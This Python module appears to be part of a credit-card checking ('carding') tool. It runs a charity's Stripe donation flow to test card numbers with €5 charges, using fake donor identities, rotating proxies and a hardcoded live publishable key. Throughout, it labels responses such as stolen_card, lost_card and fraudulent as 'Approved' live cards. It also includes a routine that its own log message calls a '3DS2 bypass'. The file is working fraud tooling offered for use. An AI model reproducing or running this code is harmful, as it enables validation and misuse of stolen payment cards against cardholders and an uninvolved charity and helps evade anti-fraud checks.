import httpx
import random
import string
import time
import json
import re
import logging
import os
import base64

logger = logging.getLogger("donate_ch")

DONATE_URL = "https://christiansinaude.org"
STRIPE_API = "https://api.stripe.com/v1"
STRIPE_PK = "pk_live_51IbOaaF0eO3xGePOXby7yrcYK3k79NrTnMN0S5NcL9yjrTbiU80Du8dE3y5Wqo8eJCxNaUtEaaAHRtr5i1AqbMzV00hv3gjpMf"

MAX_RETRIES = 2
SITE_TIMEOUT = 20
STRIPE_TIMEOUT = 25
PROXY_TEST_TIMEOUT = 10

PROXY_FILE = os.path.join(os.path.dirname(os.path.dirname(__file__)), "proxy.txt")

UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36"


def _random_guid():
    return "".join(random.choices(string.hexdigits.lower(), k=32))


def _random_email():
    return "".join(random.choices(string.ascii_lowercase + string.digits, k=10)) + "@gmail.com"


def _random_name():
    first_names = ["James", "John", "Michael", "William", "David", "Robert", "Thomas", "Charles", "Chris", "Daniel"]
    last_names = ["Smith", "Johnson", "Williams", "Brown", "Jones", "Taylor", "Wilson", "Davies", "Evans", "Thomas"]
    return random.choice(first_names), random.choice(last_names)


def _get_global_proxy():
    try:
        if os.path.exists(PROXY_FILE):
            with open(PROXY_FILE, "r") as f:
                lines = [l.strip() for l in f if l.strip()]
            if lines:
                raw = random.choice(lines)
                parts = raw.split(":")
                if len(parts) == 4:
                    host, port, user, pwd = parts
                    return f"http://{user}:{pwd}@{host}:{port}"
                elif len(parts) == 2:
                    return f"http://{parts[0]}:{parts[1]}"
    except Exception:
        pass
    return None


async def _try_site_session(proxy=None):
    first, last = _random_name()
    email = _random_email()

    headers = {
        "User-Agent": UA,
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.9",
    }

    client_kwargs = dict(
        timeout=httpx.Timeout(SITE_TIMEOUT),
        max_redirects=10,
        headers=headers,
        follow_redirects=True,
    )
    if proxy:
        client_kwargs["proxy"] = proxy

    async with httpx.AsyncClient(**client_kwargs) as client:
        r_donate = await client.get(f"{DONATE_URL}/donate.php?fbutton=")
        if r_donate.status_code != 200:
            return None, f"Donation page unavailable ({r_donate.status_code})"

        r_checkout = await client.post(
            f"{DONATE_URL}/checkout.php",
            data={
                "recipient": "ESCF",
                "fname": first,
                "lname": last,
                "email": email,
                "donation": "5",
            },
        )
        if r_checkout.status_code != 200:
            return None, f"Checkout step failed ({r_checkout.status_code})"

        r_checkout1 = await client.post(
            f"{DONATE_URL}/checkout1.php",
            data={
                "recipient": "ESCF",
                "amount": "5",
                "fnamet": first,
                "lname": last,
                "email": email,
                "submit": "",
            },
        )
        if r_checkout1.status_code != 200:
            return None, f"Checkout page failed ({r_checkout1.status_code})"

        if "stripe" not in r_checkout1.text.lower() and "card" not in r_checkout1.text.lower():
            return None, "Checkout session invalid"

        r_create = await client.post(
            f"{DONATE_URL}/create.php",
            json={"items": [{"id": "xl-tshirt"}]},
            headers={
                "User-Agent": UA,
                "Content-Type": "application/json",
                "Origin": DONATE_URL,
                "Referer": f"{DONATE_URL}/checkout1.php",
            },
        )

        if r_create.status_code != 200:
            return None, f"PaymentIntent creation failed ({r_create.status_code})"

        try:
            create_data = r_create.json()
        except Exception:
            return None, "Invalid PaymentIntent response"

        client_secret = create_data.get("clientSecret")
        if not client_secret or "_secret_" not in client_secret:
            return None, "No valid client secret received"

        pi_id = client_secret.split("_secret_")[0]
        if not pi_id or not pi_id.startswith("pi_"):
            return None, "Invalid PaymentIntent ID"

        return {"client_secret": client_secret, "pi_id": pi_id, "first": first, "last": last, "email": email}, None


def _classify_3ds_result(resp, prefix):
    status = resp.get("status", "")
    if status == "succeeded":
        return f"Charged - {prefix} + Payment Successful €5"
    if status == "requires_capture":
        return f"Charged - {prefix} + Authorized €5"

    if "error" in resp:
        err = resp["error"]
        code = err.get("code", "")
        decline = err.get("decline_code", "")
        msg_text = err.get("message", "")
        live_declines = [
            "insufficient_funds", "do_not_honor", "lost_card", "stolen_card",
            "pickup_card", "restricted_card", "security_violation",
            "incorrect_cvc", "invalid_cvc", "incorrect_zip",
            "card_velocity_exceeded", "withdrawal_count_limit_exceeded",
            "fraudulent",
        ]
        if decline in live_declines or code in live_declines:
            return f"Approved - {prefix} + {decline or code}"
        if code == "card_declined":
            return f"Declined - {prefix} + {decline or 'Card Declined'}"
        if code == "expired_card":
            return f"Declined - {prefix} + Expired Card"
        return f"Declined - {prefix} + {code}: {msg_text[:40]}"

    if status == "requires_payment_method":
        last_error = resp.get("last_payment_error", {})
        if last_error:
            code = last_error.get("code", "")
            decline = last_error.get("decline_code", "")
            live_declines = [
                "insufficient_funds", "do_not_honor", "lost_card", "stolen_card",
                "pickup_card", "restricted_card", "security_violation",
                "incorrect_cvc", "invalid_cvc", "incorrect_zip",
                "card_velocity_exceeded", "withdrawal_count_limit_exceeded",
                "fraudulent",
            ]
            if decline in live_declines or code in live_declines:
                return f"Approved - {prefix} + {decline or code}"
            if code == "card_declined":
                return f"Declined - {prefix} + {decline or 'Card Declined'}"
            return f"Declined - {prefix} + {code}"
        return f"Declined - {prefix} + Payment Failed"

    return f"Approved - {prefix} (status: {status})"


async def _handle_3ds2(client, headers, source_id, ds_name, sdk_data, client_secret, pi_id, pk):
    browser_data = {
        "browser_java_enabled": "false",
        "browser_javascript_enabled": "true",
        "browser_language": "en-US",
        "browser_color_depth": "24",
        "browser_screen_height": "1080",
        "browser_screen_width": "1920",
        "browser_tz": str(random.choice([300, 360, 420, 480])),
        "browser_user_agent": UA,
        "browser_accept_header": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
    }

    one_click = {
        "one_click_authn_device_support[hosted]": "false",
        "one_click_authn_device_support[same_origin_frame]": "false",
        "one_click_authn_device_support[spc_eligible]": "false",
        "one_click_authn_device_support[passkey_eligible]": "false",
        "one_click_authn_device_support[publickey_credentials_get_allowed]": "true",
    }

    three_ds_method_url = sdk_data.get("three_ds_method_url", "")
    server_transaction_id = sdk_data.get("server_transaction_id", "")
    ds_trans_id = sdk_data.get("directory_server_transaction_id", "")

    fingerprint_data = {
        "source": source_id,
        "browser": json.dumps(browser_data),
        "key": pk,
    }
    fingerprint_data.update(one_click)

    try:
        r_fp = await client.post(
            f"{STRIPE_API}/3ds2/fingerprint",
            data=fingerprint_data,
            headers=headers,
        )
        fp_resp = r_fp.json()
    except Exception as e:
        logger.info(f"3DS2 fingerprint request failed: {e}")
        return None

    if "error" in fp_resp:
        logger.info(f"3DS2 fingerprint error: {fp_resp['error'].get('message', '')}")
        return None

    fp_state = fp_resp.get("state", "")
    if fp_state == "failed":
        return "Declined - 3DS Fingerprint Failed"

    fp_created_ds_trans = fp_resp.get("ds_trans_id", "") or fp_resp.get("directory_server_transaction_id", "")
    if fp_created_ds_trans:
        ds_trans_id = fp_created_ds_trans

    if three_ds_method_url and server_transaction_id:
        try:
            method_payload = {
                "threeDSServerTransID": server_transaction_id,
                "threeDSMethodNotificationURL": "https://hooks.stripe.com/3d_secure_2_return"
            }
            encoded_method = base64.urlsafe_b64encode(json.dumps(method_payload).encode()).decode().rstrip("=")
            await client.post(
                three_ds_method_url,
                data=f"threeDSMethodData={encoded_method}",
                headers={
                    "Content-Type": "application/x-www-form-urlencoded",
                    "User-Agent": UA,
                    "Origin": "https://js.stripe.com",
                },
            )
        except Exception:
            pass
        import asyncio
        await asyncio.sleep(1.5)

    auth_data = {
        "source": source_id,
        "browser": json.dumps(browser_data),
        "key": pk,
    }
    if server_transaction_id:
        auth_data["three_ds_server_trans_id"] = server_transaction_id
    if ds_trans_id:
        auth_data["ds_trans_id"] = ds_trans_id
    auth_data.update(one_click)

    try:
        r_auth = await client.post(
            f"{STRIPE_API}/3ds2/authenticate",
            data=auth_data,
            headers=headers,
        )
        auth_resp = r_auth.json()
    except Exception as e:
        logger.info(f"3DS2 authenticate request failed: {e}")
        return None

    if "error" in auth_resp:
        logger.info(f"3DS2 authenticate error: {auth_resp['error'].get('message', '')}")
        return None

    ares_status = ""
    ares = auth_resp.get("ares", {})
    if isinstance(ares, dict):
        ares_status = ares.get("transStatus", "")

    state = auth_resp.get("state", "")

    async def _reconfirm(label):
        reconfirm_data = {
            "key": pk,
            "client_secret": client_secret,
            "setup_future_usage": "off_session",
        }
        try:
            r2 = await client.post(
                f"{STRIPE_API}/payment_intents/{pi_id}/confirm",
                data=reconfirm_data,
                headers=headers,
            )
            resp2 = r2.json()
        except Exception as e:
            logger.info(f"3DS2 re-confirm failed: {e}")
            return None

        s2 = resp2.get("status", "")
        if s2 == "requires_action":
            reconfirm_data2 = {
                "key": pk,
                "client_secret": client_secret,
            }
            try:
                r3 = await client.post(
                    f"{STRIPE_API}/payment_intents/{pi_id}/confirm",
                    data=reconfirm_data2,
                    headers=headers,
                )
                resp2 = r3.json()
            except Exception:
                pass

        return _classify_3ds_result(resp2, label)

    if ares_status == "Y" or state == "succeeded":
        return await _reconfirm("3DS Passed")

    elif ares_status == "A":
        return await _reconfirm("3DS Attempted")

    elif ares_status == "U" or ares_status == "":
        result = await _reconfirm("3DS Unavailable")
        if result:
            return result
        return None

    elif ares_status in ("C", "D"):
        result = await _reconfirm("3DS Challenge")
        if result:
            return result
        return None

    elif ares_status == "N":
        return "Declined - 3DS Authentication Failed"

    elif ares_status == "R":
        return "Declined - 3DS Rejected"

    return None


async def donate_ch_check(cc, mm, yy, cvv, proxy=None):
    start = time.time()

    if len(yy) == 2:
        exp_year = f"20{yy}"
    else:
        exp_year = yy
    mm = mm.zfill(2)

    stripe_headers = {
        "User-Agent": UA,
        "Content-Type": "application/x-www-form-urlencoded",
        "Origin": "https://js.stripe.com",
        "Referer": "https://js.stripe.com/",
        "Accept": "application/json",
    }

    session_data = None
    session_error = None

    proxies_to_try = []
    if proxy:
        proxies_to_try.append(proxy)
    global_proxy = _get_global_proxy()
    if global_proxy and global_proxy != proxy:
        proxies_to_try.append(global_proxy)
    proxies_to_try.append(None)

    for p in proxies_to_try:
        try:
            session_data, session_error = await _try_site_session(proxy=p)
            if session_data:
                break
        except (httpx.ConnectTimeout, httpx.ReadTimeout, httpx.WriteTimeout, httpx.PoolTimeout):
            logger.info(f"Proxy timeout during site session: {p[:30] if p else 'direct'}...")
            session_error = "Connection timeout"
            continue
        except httpx.NetworkError:
            logger.info(f"Network error during site session: {p[:30] if p else 'direct'}...")
            session_error = "Network error"
            continue
        except Exception as e:
            logger.warning(f"Site session error with proxy {p[:30] if p else 'direct'}: {e}")
            session_error = str(e)[:80]
            continue

    if not session_data:
        elapsed = round(time.time() - start, 2)
        return f"Error - {session_error or 'Site unreachable'} [{elapsed}s]"

    client_secret = session_data["client_secret"]
    pi_id = session_data["pi_id"]
    first = session_data["first"]
    last = session_data["last"]
    email = session_data["email"]

    postal = str(random.randint(10000, 99999))
    guid = _random_guid()
    muid = _random_guid()
    sid = _random_guid()
    last4 = cc[-4:]
    info = f"CARD | {last4}"

    confirm_data = {
        "payment_method_data[type]": "card",
        "payment_method_data[card][number]": cc,
        "payment_method_data[card][exp_month]": mm,
        "payment_method_data[card][exp_year]": exp_year,
        "payment_method_data[card][cvc]": cvv,
        "payment_method_data[billing_details][name]": f"{first} {last}",
        "payment_method_data[billing_details][email]": email,
        "payment_method_data[billing_details][address][country]": "FR",
        "payment_method_data[billing_details][address][postal_code]": postal,
        "payment_method_data[pasted_fields]": "number",
        "payment_method_data[payment_user_agent]": "stripe.js/b350feb82f; stripe-js-v3/b350feb82f; card-element",
        "payment_method_data[referrer]": DONATE_URL,
        "payment_method_data[time_on_page]": str(random.randint(30000, 120000)),
        "expected_payment_method_type": "card",
        "use_stripe_sdk": "true",
        "setup_future_usage": "off_session",
        "key": STRIPE_PK,
        "client_secret": client_secret,
    }

    try:
        async with httpx.AsyncClient(timeout=httpx.Timeout(STRIPE_TIMEOUT), follow_redirects=True) as stripe_client:

            confirm_url = f"{STRIPE_API}/payment_intents/{pi_id}/confirm"
            r_confirm = await stripe_client.post(
                confirm_url,
                data=confirm_data,
                headers=stripe_headers,
            )
            confirm_resp = r_confirm.json()
            elapsed = round(time.time() - start, 2)

            pm_obj = confirm_resp.get("payment_method", {})
            if isinstance(pm_obj, dict):
                card_obj = pm_obj.get("card", {})
                if card_obj:
                    brand = card_obj.get("brand", "unknown").upper()
                    last4_val = card_obj.get("last4", last4)
                    funding = card_obj.get("funding", "unknown").upper()
                    country = card_obj.get("country", "??")
                    info = f"{brand} {funding} | {country} | {last4_val}"

            err_pm = None
            if "error" in confirm_resp:
                err_pm = confirm_resp["error"].get("payment_method", {})
            if not err_pm:
                for key in ("last_payment_error",):
                    lpe = confirm_resp.get(key, {})
                    if isinstance(lpe, dict) and "payment_method" in lpe:
                        err_pm = lpe["payment_method"]
                        break
            if err_pm and isinstance(err_pm, dict):
                card_obj = err_pm.get("card", {})
                if card_obj:
                    brand = card_obj.get("brand", "unknown").upper()
                    last4_val = card_obj.get("last4", last4)
                    funding = card_obj.get("funding", "unknown").upper()
                    country = card_obj.get("country", "??")
                    info = f"{brand} {funding} | {country} | {last4_val}"

            if "error" in confirm_resp:
                err = confirm_resp["error"]
                code = err.get("code", "")
                decline = err.get("decline_code", "")
                msg = err.get("message", "")

                live_declines = [
                    "insufficient_funds", "do_not_honor", "lost_card", "stolen_card",
                    "pickup_card", "restricted_card", "security_violation",
                    "incorrect_cvc", "invalid_cvc", "incorrect_zip",
                    "card_velocity_exceeded", "withdrawal_count_limit_exceeded",
                    "fraudulent",
                ]
                if decline in live_declines or code in live_declines:
                    return f"Approved - {decline or code} | {info} [{elapsed}s]"
                if code == "card_declined":
                    if decline:
                        return f"Declined - {decline} | {info} [{elapsed}s]"
                    return f"Declined - Card Declined | {info} [{elapsed}s]"
                if code == "expired_card":
                    return f"Declined - Expired Card | {info} [{elapsed}s]"
                if code == "processing_error":
                    return f"Declined - Processing Error | {info} [{elapsed}s]"
                return f"Declined - {code}: {msg[:60]} | {info} [{elapsed}s]"

            status = confirm_resp.get("status", "")

            if status == "succeeded":
                return f"Charged - Payment Successful €5 | {info} [{elapsed}s]"

            if status == "requires_action":
                next_action = confirm_resp.get("next_action", {})
                action_type = next_action.get("type", "")
                if action_type == "use_stripe_sdk":
                    sdk_data = next_action.get("use_stripe_sdk", {})
                    sdk_type = sdk_data.get("type", "")
                    source_id = sdk_data.get("three_d_secure_2_source", "")
                    ds_name = sdk_data.get("directory_server_name", "")

                    if sdk_type == "stripe_3ds2_fingerprint" and source_id:
                        try:
                            threeds_result = await _handle_3ds2(
                                stripe_client, stripe_headers, source_id,
                                ds_name, sdk_data, client_secret, pi_id, STRIPE_PK
                            )
                            if threeds_result:
                                elapsed = round(time.time() - start, 2)
                                return f"{threeds_result} | {info} [{elapsed}s]"
                        except Exception as e:
                            logger.info(f"3DS2 bypass failed: {e}")

                    elapsed = round(time.time() - start, 2)
                    return f"Approved - 3DS Required | {info} [{elapsed}s]"
                return f"Approved - Action Required ({action_type}) | {info} [{elapsed}s]"

            if status == "requires_capture":
                return f"Charged - Payment Authorized €5 | {info} [{elapsed}s]"

            if status == "requires_payment_method":
                last_error = confirm_resp.get("last_payment_error", {})
                if last_error:
                    code = last_error.get("code", "")
                    decline = last_error.get("decline_code", "")
                    msg = last_error.get("message", "")
                    live_declines = [
                        "insufficient_funds", "do_not_honor", "lost_card", "stolen_card",
                        "pickup_card", "restricted_card", "security_violation",
                        "incorrect_cvc", "invalid_cvc", "incorrect_zip",
                        "card_velocity_exceeded", "withdrawal_count_limit_exceeded",
                        "fraudulent",
                    ]
                    if decline in live_declines or code in live_declines:
                        return f"Approved - {decline or code} | {info} [{elapsed}s]"
                    if code == "card_declined":
                        if decline:
                            return f"Declined - {decline} | {info} [{elapsed}s]"
                        return f"Declined - Card Declined | {info} [{elapsed}s]"
                    if code == "expired_card":
                        return f"Declined - Expired Card | {info} [{elapsed}s]"
                    return f"Declined - {code}: {msg[:60]} | {info} [{elapsed}s]"
                return f"Declined - Payment Failed | {info} [{elapsed}s]"

            return f"Declined - Status: {status} | {info} [{elapsed}s]"

    except (httpx.ConnectTimeout, httpx.ReadTimeout, httpx.WriteTimeout, httpx.PoolTimeout):
        elapsed = round(time.time() - start, 2)
        return f"Error - Stripe API Timeout [{elapsed}s]"
    except httpx.NetworkError:
        elapsed = round(time.time() - start, 2)
        return f"Error - Network Error [{elapsed}s]"
    except Exception as e:
        logger.warning(f"Unexpected error in Stripe phase: {e}")
        elapsed = round(time.time() - start, 2)
        return f"Error - {str(e)[:80]} [{elapsed}s]"
